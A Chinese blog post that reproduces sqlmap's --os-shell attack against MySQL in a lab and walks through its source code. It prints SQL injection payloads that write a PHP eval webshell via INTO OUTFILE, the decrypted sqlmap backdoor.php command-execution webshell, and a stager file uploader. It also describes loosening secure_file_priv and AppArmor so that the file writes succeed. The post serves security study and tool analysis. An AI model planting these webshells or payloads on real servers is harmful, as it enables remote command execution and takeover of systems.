
目录* [前言](https://github.com)
* [mysql数据库注入getshell](https://github.com)
* [源码分析](https://github.com)

# 前言


最近详细看了@v1ll4n师傅写的几篇关于sqlmap源码分析的文章（[sqlmap内核分析](https://github.com "sqlmap内核分析")）收获颇多。借此机会在这里记录一下我较感兴趣的sqlmap中getshell相关部分的分析，就简单从源码的角度看看sqlmap是如何通过\-\-os\-shell一键getshell的。


# mysql数据库注入getshell


先抛开sqlmap不谈，想要通过数据库getshell大的前提条件就是有权限并且知道相关路径，这里以最为熟知的mysql数据库为例。


利用条件：


1. 系统变量secure\_file\_priv为空或者为指定路径
2. 知道网站的绝对路径
3. 具有文件写权限


以上这三个条件缺一不可：


第一，`secure_file_priv`是MySQL数据库中的一个系统变量，用于限制数据导入和导出操作。如果将secure\_file\_priv设置为一个特定的目录路径，则数据库中进行文件导入和导出操作时就只能对这个目录进行操作；如果设置为NULL，则表示禁止文件的导入和导出操作；如果设置为空（不是NULL）则会允许相对自由的文件操作，没有限制。


不同的系统和安装方式导致secure\_file\_priv的默认值也会有差异。通常情况为NULL，但有的也会指定一个默认的目录如下。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241122192156584-774296178.png)](https://github.com)


这个参数是不能通过sql语句直接修改的，因为它是一个只读参数。如果想要修改，则只能通过修改配置文件（windows下为my.ini，linux下为my.cnf），然后再通过重启mysql服务的方式来使它生效。


第二，知道网站的绝对路径。如果不知道绝对路径，那么菜刀这类的webshell管理工具就无法连接。


第三，具有文件的写权限。如果网站目录下面不允许写文件，那么即使是知道网站的绝对路径也没有太大的利用价值。




---


接下来以linux环境（ubuntu22\.04/mysql5\.7\.42）为例复现一下，这里首先把secure\_file\_priv的值改为空，为后面写文件提供条件。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241122192245950-1492650849.png)](https://github.com)


常规的写shell方式大概如下：使用union联合查询，再配合`select ... into outfile/dumpfile ...`语句。



```
union select 'php eval($_POST[a]);?' into outfile '/var/www/html/test.php';
union select 'php eval($_POST[a]);?' into dumpfile '/var/www/html/test.php';

```

尝试了一下写文件，报错提示没有权限。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123142339643-63843542.png)](https://github.com)


意料之中，因为正常情况下我们其实并不确定mysql是否有权限在我们指定的var/www/html目录下写文件。


解决文件写入权限的问题：



> 尝试把/var/www/html目录权限改为777，没成功。修改文件的属主等，均没成功 。。。
> 
> 
> 折腾了很久，最终找到了解决方法：[https://stackoverflow.com/questions/36391551/error\-1\-hy000\-cant\-create\-write\-to\-file\-errcode\-13\-permission\-denied](https://github.com)
> 
> 
> [![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241122195537692-1017477828.png)](https://github.com)
> 
> 
> 原因：如果mysqld处于强制模式，那么AppArmor就会限制进程对资源的访问权限，AppArmor和SELinux类似，也是一个Linux系统下的强制访问控制安全机制。


按照上图给出的解决方法，编辑`/etc/apparmor.d/usr.sbin.mysqld`文件，在文件底部的位置添加对/var/www/html目录的读写控制。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241122200339542-1262167260.png)](https://github.com)


修改完后，重新加载AppArmor，这次写入成功了。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123143316817-1701074008.png)](https://github.com)


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123143442084-98863415.png)](https://github.com)


尝试\-\-os\-shell也可以成功getshell。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123144511553-366699962.png)](https://github.com)


通过上面一系列的操作，其实可以看到，想要直接通过mysql数据库写shell的方式getshell是比较困难的。在实际环境中，这三个条件几乎不可能同时完全满足。



> 但是没关系！学习，学习\-\-os\-shell getshell的代码实现原理这并不困难o(￣▽￣)o\~


接下来进入正题，打开PyCharm看看源码。


# 源码分析


仔细观察上面使用\-\-os\-shell命令输出的信息，可以发现它在网站目录下面写了两个php文件。你可能会和我有同样的疑问，为什么要写两个文件？它们都是什么，又什么作用？为了解释这些疑问，看sqlmap的源码会有找到一个比较清晰的答案。


关于sqlmap的基本流程分析这里不做介绍了，可以参考@v1ll4n师傅写的：[https://www.anquanke.com/post/id/159260](https://github.com)


这里只针对\-\-os\-shell这部分功能的源码进行简要的分析（sqlmap版本1\.8\#stable）。


有关\-\-os\-shell的处理函数被定义在plugins/generic/takeover.py\#Takeover.osShell下面。takeover.py模块中还有关于操作系统接管功能的函数定义，这里只关注osShell函数即可。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123224237893-929403207.png)](https://github.com)


主要是5个步骤：


1、判断是否采用web后门方式。


2、获取远程临时路径。


3、初始化环境。


4、执行shell操作部分。


5、最后清理操作部分。


根据堆叠查询可用性和配置判断是否使用web方式，如果堆叠查询不可用且数据库是mysql，那么就采用web后门模式（web\=Ture）。


调用函数`getRemoteTempPath`它会尝试返回一个用于存储临时文件的远程路径。根据不同的数据库管理系统类型、操作系统类型以及相关配置选项来确定合适的临时文件存储路径。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123224843466-868602864.png)](https://github.com)


调用函数`initEnv`来进行环境初始化操作。当使用web后门模式，就进行web初始化操作webInit。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123225202117-1231522949.png)](https://github.com)


接下来调用的函数`webInit`就是较为核心的部分了，它定义在lib/takeover/web.py\#Web.webInit里面。用于在网站的目录写入webshell后门。其中具体包括确定脚本语言类型（aspx/asp/jsp/php），获取完整的文件路径，选择合适的上传目录，通过不同方法上传stager文件和后门文件，最后进行相关的测试确保后门能够正常执行命令。


这个函数比较长，这里挑重点说一下：


第一步确认应用语言类型：


首先会初始化相关变量，获取公开的应用语言类型，存储在choices列表中。然后需要根据当前的url后缀确定默认语言。如果没有通过url后缀确定出来，那么Windows平台默认就是asp，其他均视为php。或者最后由用户自己输入应用语言类型。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123225826883-55404399.png)](https://github.com)


第二步准备上传目录和上传文件的内容：


首先sqlmap它会主动通过从不同来源解析文件路径，包括从原始页面匹配的url中解析，从修改后的url中解析，从请求参数中解析，从cookie中解析。尽可能的找多的完整文件路径存贮在kb.absFilePaths列表中。


上传目录列表directories，它可以通过getManualDirectories函数获取手动指定的目录列表，还会调用getAutoDirectories函数获取自动生成的目录列表（即kb.absFilePaths列表，然后再使用正则表达式对路径path进行一个处理。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123230728790-1227964948.png)](https://github.com)


上传目录准备完成，接着就需要准备待写入的stager文件和backdoor后门文件的文件内容，首先会生成一个随机的后门文件名（tmpb\+随机字符串）以备使用，然后需要从分别本地来获取后门的内容和stager的内容。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123231023245-1455259667.png)](https://github.com):[milou加速器](https://xinminxuehui.org)


可以不妨先来看看这两个待写入的文件是什么东西，以php脚本为例。


注意：



> 这里下划线结尾的文件是无法直接打开浏览的，原因是这些文件中包含了一些恶意的代码，sqlmap为了防止本地的杀软把这些文件误杀了，进行了加密处理。
> 
> 
> 可以通过sqlmap提供的extra/cloak/cloak.py进行解密：python cloak.py \-d \-i D:\\Temp\\sqlmap\-1\.8\\data\\shell\\backdoors\\backdoor.php\_


解密后的backdoor.php\_如下：



```
php</span
$c=$_REQUEST["cmd"];
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set("max_execution_time",0);
$z=@ini_get("disable_functions");
if(!empty($z)){
	$z=preg_replace("/[, ]+/",',',$z);
	$z=explode(',',$z);
	$z=array_map("trim",$z);
}else{
	$z=array();
}
$c=$c." 2>&1\n";
function f($n){
	global $z;
	return is_callable($n)and!in_array($n,$z);
}
if(f("system")){
	ob_start();
	system($c);
	$w=ob_get_clean();
}elseif(f("proc_open")){
	$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
	$w=NULL;
	while(!feof($t[1])){
		$w.=fread($t[1],512);
	}
	@proc_close($y);
}elseif(f("shell_exec")){
	$w=shell_exec($c);
}elseif(f("passthru")){
	ob_start();
	passthru($c);
	$w=ob_get_clean();
}elseif(f("popen")){
	$x=popen($c,r);
	$w=NULL;
	if(is_resource($x)){
		while(!feof($x)){$w.=fread($x,512);}
	}
	@pclose($x);
}elseif(f("exec")){
	$w=array();
	exec($c,$w);
	$w=join(chr(10),$w).chr(10);
}else{
	$w=0;
}
echo"
```
$w
```
";
?>

```

这段php代码实现了远程代码命令执行的功能，通过url请求中的cmd参数接受命令，然后通过system，proc\_open，shell\_exec等函数执行此命令，最后输出命令执行结果。


解密后的stager.php\_如下：



```
php</span
if (isset($_REQUEST["upload"])){
	$dir=$_REQUEST["uploadDir"];
	if (phpversion()<'4.1.0'){
		$file=$HTTP_POST_FILES["file"]["name"];
		@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();
	}else{
		$file=$_FILES["file"]["name"];
		@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();
	}
	@chmod($dir."/".$file,0755);
	echo "File uploaded";
}else {
	echo "$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data>sqlmap file uploaderto directory:  ";
}
?>

```

这段php实现了一个简单的文件上传功能，根据php的版本来处理上传的文件，并将文件移动到指定的目录下，最后设置上传文件的权限并反馈上传成功的信息。


第三步上传文件：


上传文件首先需要确定上传文件的路径。这里会遍历事先准备好的上传目录列表directories，再拼接成一个完整的stager文件路径。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123232609656-513388175.png)](https://github.com)


接着会调用函数`_webFileInject`来将指定的文件内容注入到指定目录下。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123232720838-990111642.png)](https://github.com)


关于\_webFileInject函数，它是文件上传的核心实现，通过构造合适的sql查询语句来实现文件的上传操作，最后再获取执行注入操作后的页面内容并返回。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123233017879-370819831.png)](https://github.com)


这里通过函数`getSQLSnippet`来获取一个针对mysql数据库write\_file\_limit的sql代码片段（data/procs/mysql/write\_file\_limit.sql），内容如下：



```
LIMIT 0,1 INTO OUTFILE '%OUTFILE%' LINES TERMINATED BY 0x%HEXSTRING%-- -

```

sql中的`LINES TERMINATED BY 0x%HEXSTRING%`本来是用作设置每行数据结束的标记，用来定义行结束的格式。这里的思路是将我们的要写入的文件内容当作一个结束标记写入文件，当然这是16进制编码后的。


调试就可以清楚地看到此时的payload：


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123233722588-573672309.png)](https://github.com)


大致这样：



```
admin' LIMIT 0,1 INTO OUTFILE '/var/www/tmpumutd.php' LINES TERMINATED BY ...stager文件内容(16进制编码)...-- -

```

函数\_webFileInject执行完毕后。会去请求这个请求这个已上传的stager文件，通过并检查页面中是否包含“sqlmap file uploader”以此来判断是否上传成功。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123234237440-853483134.png)](https://github.com)


此时如果没有上传成功的话，就会回使用union查询来上传文件，通过调用函数`unionWriteFile`来写文件。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123234405907-738963212.png)](https://github.com)


待上传stager文件成功后，还会去检查stager文件页面内容是否可动态解释：


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123234702742-970207923.png)](https://github.com)


接下来要上传第二个文件了，也就是backdoor后门文件，但与上传stager文件有所不同，上传backdoor会先调用函数`webUpload`，如果函数`webUpload`上传失败，才会提示是否使用和上传stager文件相同的方式上传文件。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123235342285-1486372281.png)](https://github.com)


函数webUpload它会先将文件内容转换为字节流并进行流操作处理。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123235822228-1459524419.png)](https://github.com)


它再调用函数`_webFileStreamUpload`函数完成最终的上传操作，\_webFileStreamUpload上传就需要借助刚才已上传的stager文件，前面了解到其实stager文件实现的就是一个文件上传的功能，通过Request.getPage发送请求到stager文件完成wbsehll后门文件的上传。最后同样会检查后门文件是否上传成功。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241123235954568-1589935101.png)](https://github.com)


到这里，上传文件的工作就全部完成了。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241124121716744-1372344006.png)](https://github.com)


可以看到stager文件是由mysql用户写的，真正的wenshell文件是由web用户（nginx）写入的。小木马拉大木马，这也是写木马的常规操作了，类似于CS中的stager木马的过程。


第四步执行shell操作：


当判断出webshell的url路径不为空时，就可以调用执行函数shell来获取交互shell了，它定义在lib/takeover/abstraction\#Abstraction.shell里面。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241124000526211-596614454.png)](https://github.com)


这里的函数`runCmd`会调用函数`evalCmd`来执行最终的命令。首先它会去判断数据库类型来确定命令执行方式，这里是使用web后门的方式执行命令，其他方式先不谈。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241124000837428-925297167.png)](https://github.com)


函数`webBackdoorRunCmd`通过后门的url来执行指定的命令，然后从返回页面内容中提取命令执行输出。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241124001203958-1280816361.png)](https://github.com)


最后的最后，执行exit退出命令后，sqlmap会去删除已上传的这两个文件清除痕迹。


[![image](https://img2024.cnblogs.com/blog/3222269/202411/3222269-20241124001415574-184051008.png)](https://github.com)


到这里函数osShell的基本执行流程就分析完了，对于sqlmap在mysql数据库通过webshell的方式getshell会有一个基本的理解了。其实关于sqlmap中getshll的还有很多可聊的，包括udf，还有mssql数据库的利用方式等等，但限于篇幅在此就不详细展开了。



> 参考文章
> [https://stackoverflow.com/questions/36391551/error\-1\-hy000\-cant\-create\-write\-to\-file\-errcode\-13\-permission\-denied](https://github.com)
> [https://xz.aliyun.com/t/7942?time\_\_1311\=n4%2BxnD0DyDu73AKex05%2Bb8DOiGC7iQ8oi74D](https://github.com)
> [https://mp.weixin.qq.com/s?\_\_biz\=MzIyMjkzMzY4Ng\=\=\&mid\=2247485339\&idx\=1\&sn\=ea76ee0d56b8a95a118a60d111d48160](https://github.com)


若有错误，欢迎指正！o(￣▽￣)ブ


